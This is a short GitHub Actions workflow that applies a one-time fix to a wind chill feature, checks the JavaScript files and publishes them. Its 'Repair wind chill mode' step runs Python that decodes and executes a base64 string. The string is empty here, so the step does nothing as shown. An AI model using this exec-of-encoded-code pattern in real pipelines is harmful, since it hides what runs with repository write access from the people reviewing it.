name: One-time wind chill field fix

on:
  push:
    branches: [main]
    paths:
      - .github/workflows/fix-wind-chill-field.yml

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Repair wind chill mode
        run: python3 -c "import base64;exec(base64.b64decode(''))"
      - name: Check JavaScript syntax and wiring
        run: |
          node --check js/wind-chill.js
          node --check js/config.js
          grep -q "wind-chill.js?v=4" js/config.js
          grep -q "js/config.js?v=8.86" index.html
          grep -q "windSource:'model'" js/wind-chill.js
      - name: Publish fix
        run: bash scripts/publish_generated_data.sh 'Repair wind chill temperature field' js/wind-chill.js js/config.js index.html
